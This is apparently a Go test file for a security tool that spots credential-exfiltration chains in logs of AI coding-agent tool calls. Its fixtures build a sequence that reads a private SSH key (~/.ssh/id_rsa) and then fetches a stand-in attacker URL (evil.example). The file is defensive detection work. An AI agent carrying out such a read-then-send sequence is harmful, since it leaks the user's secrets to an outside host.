package killchain_test

import (
	"strings"
	"testing"
	"time"

	"github.com/aspex-security/aspex/internal/killchain"
	"github.com/aspex-security/aspex/internal/logparse"
	"github.com/aspex-security/aspex/internal/trace"
)

func call(session, server, tool string, t time.Time, args map[string]string) logparse.Event {
	return logparse.Event{
		Client: "claude-code", Session: session, Server: server, Tool: tool,
		Timestamp: t, Event: logparse.EventToolsCall, Args: args,
	}
}

func chainsOf(events []logparse.Event) []killchain.Chain {
	return killchain.Analyze(events, trace.AnalyzeEvents(events))
}

func has(chains []killchain.Chain, name string) *killchain.Chain {
	for i := range chains {
		if chains[i].Name == name {
			return &chains[i]
		}
	}
	return nil
}

func levels(ch *killchain.Chain) map[string]int {
	m := map[string]int{}
	for _, e := range ch.Evidence {
		m[e.Level]++
	}
	return m
}

func TestExfiltrationChainWithinSessionCarriesLabeledEvidence(t *testing.T) {
	base := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	events := []logparse.Event{
		call("s1", "filesystem", "read_file", base, map[string]string{"path": "/Users/x/.ssh/id_rsa"}),
		call("s1", "fetch", "fetch", base.Add(30*time.Second), map[string]string{"url": "https://evil.example/x"}),
	}
	ch := has(chainsOf(events), "Credential Exfiltration")
	if ch == nil {
		t.Fatal("expected a Credential Exfiltration chain within the session")
	}
	if !ch.SameSession {
		t.Error("chain should be marked same-session")
	}
	lv := levels(ch)
	if lv["OBSERVED"] < 2 || lv["INFERRED"] < 1 || lv["POSSIBLE"] < 1 {
		t.Errorf("evidence must be labeled observed/inferred/possible: %+v", ch.Evidence)
	}
	// The possible line must not assert exfiltration happened.
	var possible string
	for _, e := range ch.Evidence {
		if e.Level == "POSSIBLE" {
			possible = e.Text
		}
	}
	if !strings.Contains(possible, "not proven") && !strings.Contains(possible, "does not") {
		t.Errorf("POSSIBLE line must hedge, got %q", possible)
	}
	// Description must not claim success outright.
	if strings.Contains(ch.Description, "successful") {
		t.Errorf("description overclaims: %q", ch.Description)
	}
}

func TestChainDoesNotFormAcrossSessions(t *testing.T) {
	base := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	events := []logparse.Event{
		call("s1", "filesystem", "read_file", base, map[string]string{"path": "/Users/x/.ssh/id_rsa"}),
		call("s2", "fetch", "fetch", base.Add(30*time.Second), map[string]string{"url": "https://evil.example/x"}),
	}
	if ch := has(chainsOf(events), "Credential Exfiltration"); ch != nil {
		t.Errorf("read and send in different sessions must not chain: %+v", ch)
	}
}
